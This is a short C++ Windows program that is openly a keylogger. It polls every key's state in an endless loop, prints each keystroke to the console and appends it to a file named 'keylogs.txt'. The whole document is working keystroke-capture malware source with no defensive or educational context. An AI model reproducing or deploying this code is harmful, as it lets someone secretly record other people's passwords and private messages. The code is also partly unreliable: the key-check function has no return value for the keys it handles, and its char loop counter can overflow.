#include <iostream>
#include <Windows.h>
#include <fstream>
#include <stdio.h>
#include <string>

using namespace std;

void WriteToLog(LPCSTR text) {
    ofstream logfile; //creates object for file stream
    logfile.open("keylogs.txt", fstream::app); //opens file for writing
    logfile << text; //writes text string to file
    logfile.close(); //closes stream
}
bool KeyIsListed(int iKey) {
    switch (iKey)
    {
    case VK_SPACE:
        cout << " "; //if space bar is pressed, print space to console
        WriteToLog(" "); //write space to logfile
        break;
    case VK_RETURN:
        cout << "\n"; //same as above, except "enter" is not the character
        WriteToLog("\n");
        break;
    case VK_SHIFT:
        cout << " *Shift* ";
        WriteToLog(" *Shift* ");
        break;
    case VK_BACK:
        cout << "\b"; //emulates backspace
        WriteToLog("\b");
        break;
    default: return false; //we need this later when determine if key exists in this list
    }
}
int main()
{
    char key;
    while(TRUE)
    {
        Sleep(10);
        for (key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                if (KeyIsListed(key) == FALSE) {
                    cout << key;
                    ofstream logfile; //creates object for file stream
                    logfile.open("keylogs.txt", fstream::app); //opens file for writing
                    logfile << key; //writes the logged key char to file
                    logfile.close(); //closes stream
                }
            }
        }
    }
    return 0;
}